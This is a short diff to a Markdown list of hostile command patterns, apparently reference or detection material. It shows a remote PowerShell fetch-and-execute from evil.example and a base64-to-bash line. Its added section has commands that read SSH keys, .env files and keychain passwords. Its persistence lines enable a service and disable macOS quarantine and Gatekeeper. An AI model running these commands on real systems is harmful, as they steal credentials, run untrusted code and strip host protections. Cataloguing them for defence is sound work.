@@ -26,12 +26,12 @@ iwr https://evil.example/payload.ps1 | iex
 echo ZWNobyBoZWxsbw== | base64 -d | bash
 ```
 
-## Credential hunting paths
-- `~/.ssh/id_rsa`
-- `~/Library/Keychains`
-- `.env`
-- `AWS_SECRET_ACCESS_KEY`
-- `GITHUB_TOKEN`
+## Credential access commands
+```sh
+cat ~/.ssh/id_rsa
+cat .env
+security find-generic-password -a "$USER"
+```
 
 ## Persistence mechanisms
 ```sh
@@ -46,4 +46,3 @@ systemctl enable evil.service
 xattr -dr com.apple.quarantine /Applications/Evil.app
 spctl --master-disable
 ```
-
